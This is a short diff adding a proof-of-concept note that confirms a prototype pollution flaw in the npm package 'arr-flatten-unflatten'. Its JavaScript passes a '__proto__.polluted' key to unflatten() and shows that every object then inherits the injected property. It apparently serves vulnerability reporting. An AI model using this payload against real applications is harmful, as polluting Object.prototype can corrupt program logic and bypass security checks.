@@ -1,0 +1,16 @@
+Confirmed the prototype pollution works.
+
+```javascript
+const { unflatten } = require("./node_modules/arr-flatten-unflatten");
+
+// The internal walker variable ("curr") in unflatten() walks/creates
+// nested objects based on dot-separated keys without blocking
+// "__proto__", letting an attacker pollute Object.prototype.
+const payload = {};
+payload["__proto__.polluted"] = "yes";
+
+unflatten(payload);
+
+// Every object in the process now inherits the polluted property.
+console.log(({}).polluted); // "yes"
+```
